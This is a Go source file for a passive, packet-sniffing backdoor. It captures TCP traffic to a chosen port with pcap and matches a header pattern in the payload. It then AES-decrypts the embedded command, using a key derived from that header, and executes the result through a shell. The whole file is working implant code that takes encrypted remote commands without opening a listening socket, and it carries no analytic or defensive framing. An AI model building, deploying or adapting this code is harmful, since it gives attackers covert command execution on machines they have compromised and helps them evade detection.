package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base32"
	"encoding/base64"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"log"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

var (
	device      string
	snapshotLen int32 = 1024
	promiscuous bool  = false
	err         error
	timeout     time.Duration = 30 * time.Second
	handle      *pcap.Handle
	bindedPort  string
	header      string
	match       []string
	pattern     string
	command     string
	re          *regexp.Regexp
)

func main() {

	checkArguments()
	// start listening
	handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout)
	if err != nil {
		fmt.Println("error with listening start")
		log.Fatal(err)
	}
	defer handle.Close()

	// add filter
	var filter = strings.Join([]string{"tcp and dst port ", bindedPort}, "")
	err = handle.SetBPFFilter(filter)
	if err != nil {
		fmt.Println("error while setting BPF filter:", err)
		log.Fatal()
	}

	// summary
	fmt.Println("program is binded to tcp port: '" + bindedPort + "' with filter: '" + filter + "' looking for pattern: '" + pattern + "'.")

	// check for a compatible packet
	re = regexp.MustCompile(pattern)
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		//parallelize with go + function
		go usePacket(packet)
	}
}

// check if all arguments are not empty and correct
func checkArguments() {

	incorrect := false
	// need 3 arguments device tcp port header
	if len(os.Args) != 4 {
		fmt.Println("not enough parameters, 3 are needed")
		showUsage()
	}
	// check if arguments are correct
	device = os.Args[1]
	if device == "" {
		fmt.Println("device is empty, please choose one of the following :")
		fmt.Println(execShellCommand(`ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'`))
		incorrect = true
	}

	bindedPort = os.Args[2]
	if _, err := strconv.Atoi(bindedPort); err != nil {
		fmt.Println(bindedPort, "is not a correct TCP port, please choose one of the following :")
		fmt.Println(execShellCommand(`netstat -pnl`))
		incorrect = true
	}

	header = os.Args[3]
	if header == "" {
		fmt.Println("header is empty")
		incorrect = true
	}
	if incorrect {
		showUsage()
	}
	pattern = strings.Join([]string{header, ":(.*)"}, "")
}

// show helper on how to use this client
func showUsage() {
	fmt.Println("usage: ./program 'DEVICE' 'TCP_PORT' 'HEADER' ")
	fmt.Println("example: ./program 'eth0' '2222' 'DNS_Session' ")
	fmt.Println("here's a list of interfaces :")
	fmt.Println(execShellCommand(`ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'`))
	fmt.Println("here's a list of tcp ports :")
	fmt.Println(execShellCommand(`netstat -pnl`))
	log.Fatal()
}

// when a packet is found, decrypt command and run
func usePacket(packet gopacket.Packet) {
	applicationLayer := packet.ApplicationLayer()
	if applicationLayer != nil {
		match = re.FindStringSubmatch(string(applicationLayer.Payload()[:]))
		if len(match) > 0 {
			// match[1] contain ns the encrypted command
			command = decryptCommand(header, match[1])
			fmt.Println("command found :", command)
			execShellCommand(command)
		}
	}
}

// aes decrypt the command with header as key and return the decrypted command
func decryptCommand(key string, cryptoText string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(cryptoText)

	block, err := aes.NewCipher([]byte(base32.StdEncoding.EncodeToString([]byte(key))))
	if err != nil {
		panic(err)
	}

	// The IV needs to be unique, but not secure. Therefore it's common to
	// include it at the beginning of the ciphertext.
	if len(ciphertext) < aes.BlockSize {
		log.Fatal("ciphertext too short")
	}
	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)

	// XORKeyStream can work in-place if the two arguments are the same.
	stream.XORKeyStream(ciphertext, ciphertext)

	return fmt.Sprintf("%s", ciphertext)
}

// execute the command and return the ouput
func execShellCommand(cmd string) string {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return fmt.Sprintf("Failed to execute command: %s", cmd)
	}
	return string(out)
}
